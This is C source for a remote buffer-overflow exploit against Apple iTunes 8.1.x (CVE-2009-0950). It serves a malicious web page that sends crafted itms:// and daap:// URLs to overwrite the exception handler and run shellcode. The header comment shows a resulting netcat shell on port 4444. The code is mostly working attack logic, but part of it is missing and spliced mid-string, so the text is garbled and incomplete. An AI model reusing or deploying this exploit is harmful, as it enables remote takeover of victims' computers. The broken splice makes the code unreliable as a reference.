/* iTunes-CVE09-s36.c
 * 
 * Apple iTunes 8.1.x (daap) Buffer overflow remote exploit (CVE-2009-0950)
 *
 * Coded By :
 *       .:: [ Simo36 ] ::.
 *
 *       Contact : Overflows@hotmail.com
 *                 His0k4.hlm@gmail.com
 *
 * 
 * 
 * Tested on : Win XP SP/SP3 Frensh , Win2k pro SP4 english
 *
 * Thanks To : Ryujin & Stack & r1z 
 * 
 * finally I want to thanks mr ryujin for printable shellcode and jump back .
 * 
 *----------------------------------------------------------
 * C:\Documents and Settings\Administrateur\Bureau\exploit>iTunes-CVE09-s36..exe
 *
 * [+] Apple iTunes 8.1.x Buffer overflow remote exploit CVE-2009-0950
 *
 * [+] By :                Simo36 & His0k4 ( Overflows@hotmail.com )
 *
 * [+] Home :               www.sec-r1z.com
 * [+] Listen on port 80
 *
 * [+] Connection accepted from 127.0.0.1:1097
 *
 * [x] Sendin welcome information....Done
 *
 * [+] sending the evil packet ...[+] Done !
 *
 * [+] check port 4444 with netcat
 *
 * [+] Connection Closed
 * 
 *
 *
 *----------------------------------------------------------------
 * C:\Documents and Settings\Administrateur\Bureau\exploit>nc -v 196.217.232.130 4444
 * sweet-9fc9abcd4 [196.217.232.130] 4444 (?) open
 * Windows XP Sweet 5.1 [SP3 v5.1.2600]
 *(C) Copyright 1985-2001 Microsoft Corp.
 *
 * C:\Program Files\Mozilla Firefox>
 *
 *
 *
 *
 *
 *
 * Note : This vulnerability can't be exploited with simply return address Because 
 *        it is affected with GS Flag .
 *
 * Compiler : Dev-C++ & mingw
 *
 */
#include <stdio.h>  
#include <string.h>  
#include <stdlib.h>  

#include <windows.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32")

#define Max_BUFF 2037
#define PORT 80

char header1[]=
"<html>\n"
"  <head><title>iTunes Remote Exploit</title>\n"
"  <script>\n"
"   function openiTunes(){document.location.assign('itms://itunes.apple.com/');}\n"
"   function prepareStack(){document.location.assign('";


char header2[]=
"');}\n   function ownSeh(){document.location.assign('";


char header3[]=
"');}\n   function ipwn(){\n"
"    prepareStack();\n    ownSeh();\n   }"
"\n   function main() {\n    openiTunes();    \n"
"    setTimeout('ipwn()',20000);\n   }\n";


char header4[]=
"  </script>\n"
"  </head>\n"
"<body ;  

/**** ITMS URL ****/
memset(url1,0x41,strlen(url1));
strcpy(&url1[0],"itms://:");
memset(&url1[8],0x42,200);
strcpy(&url1[208],"/");

// Second url 
memset(url2,0x42,strlen(url2));
strcpy(&url2[0],"daap://:");
// some padd
memset(&url2[8],0x41,425);
// align with push esp and pop edx 
strcpy(&url2[433],align_stack);
// Shellcode Ready ! 
strcpy(&url2[496],shellcode);
memset(&url2[1226],0x41,570);
strcpy(&url2[1796],"\x61\x45\x45\x45");
strcpy(&url2[1800],"\x2a\x5e\x21\x67");// Thanks Riyujin for this  
strcpy(&url2[1804],"DEEEEEEE");
strcpy(&url2[1812],jump_code);
memset(&url2[1875],0x43,161);
strcpy(&url2[2036],"C");

// building exploit 
memset(payload,0x41,7000);
strcpy(&payload[0],header1);

// evil packet is ready now :)
strcpy(&payload[strlen(header1)],url1);
strcpy(&payload[strlen(header1)+strlen(url1)],header2);
strcpy(&payload[strlen(header1)+strlen(url1)+strlen(header2)],url2);
strcpy(&payload[strlen(header1)+strlen(url1)+strlen(header2)+strlen(url2)],header3);
strcpy(&payload[strlen(header1)
             +strlen(url1)+strlen(header2)+strlen(url2)+strlen(header3)],header4);

    printf("\n[+] sending the evil packet ...");
                 
    if(send(sock2,payload,strlen(payload),0) !=-1){
        res=recv(sock2,payload,strlen(payload),0);
        sleep(100);
        closesocket(sock2);
        printf("[+] Done ! \n\n");
        printf("[+] check port 4444 with netcat \n\n");
        printf("[+] Connection Closed\n\n");
                  
                     }else printf ("[-] Error on sending payload !");
             }else   printf("Error\n");
         exit(0);
}
WSACleanup();
return 0x0;
}
